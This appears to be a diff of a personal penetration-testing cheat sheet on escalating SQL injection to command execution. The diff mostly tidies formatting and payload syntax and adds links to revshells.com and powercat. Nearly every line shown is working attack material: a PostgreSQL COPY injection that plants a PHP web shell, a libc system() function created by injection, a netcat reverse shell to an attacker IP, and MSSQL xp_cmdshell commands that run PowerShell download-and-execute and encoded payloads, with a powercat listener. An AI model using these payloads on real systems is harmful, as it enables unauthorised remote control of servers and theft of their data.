@@ -1,7 +1,8 @@
 # sql
 
-Author: Julien Bongars
-Date: 2025-09-20 17:19:28
+**Author:** Julien Bongars\
+**Date:** 2025-09-20 17:19:28
+**Path:**
 
 ---
 
@@ -22,7 +23,7 @@ Reverse shell for SQL commands
 '; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
 
 # Using extensions (if enabled):
-sql'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--
+'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--
 '; SELECT system('nc -e /bin/bash YOUR_IP 4444')--
 
 # use the program arg
@@ -40,7 +41,6 @@ EXEC sp_configure 'xp_cmdshell', '1' ;
 RECONFIGURE ;
 WAITFOR DELAY '00:00:03';
 
-
 EXEC sp_configure 'show advanced options', '1'; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', '1' ; RECONFIGURE ; WAITFOR DELAY '00:00:03'
 
 -- option 1
@@ -48,7 +48,7 @@ EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(''
 
 -- option 2
 -- get base64 from revshells.com
-EXEC xp_cmdshell 'powershell -e '<BASE64>'
+EXEC xp_cmdshell 'powershell -e <BASE64>';
 ```
 
 ### Payload
@@ -68,3 +68,8 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
 # Need to use powercat on attack machine to get shell
 powercat -l -p 4444 -e cmd
 ```
+
+## Resources
+
+- [revshells.com](https://www.revshells.com/) — MSSQL note says get base64 from here
+- [powercat](https://github.com/besimorhino/powercat) — listener used in the MSSQL payload
